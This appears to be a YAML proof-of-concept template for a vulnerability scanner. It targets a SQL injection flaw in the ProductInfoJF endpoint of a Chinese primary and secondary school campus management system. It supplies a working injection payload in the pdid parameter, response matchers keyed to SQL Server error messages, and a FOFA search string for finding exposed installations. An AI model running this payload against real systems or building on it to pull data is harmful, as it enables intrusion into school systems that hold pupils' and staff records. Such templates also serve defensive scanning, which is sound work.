id: poc-yaml-scims-productinfojf-sqli
info:
  name: 新中新中小学智慧校园信息管理系统 ProductInfoJF SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 新中新中小学智慧校园信息管理系统
  fofa: body="/Login/IndexMobi"
variables:
  t1: random_int(100,1000)
  t2: md5(t1)
requests:
- method: GET
  path: /WeiXin/ProductInfoJF?pdid=-1/sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
  expression: status_code == 200 && contains(body,"0x" + t2) && matches(body,"转换成数据类型(.*?)时失败")
    && matches(body,"在将(.*?)值")
transport: http
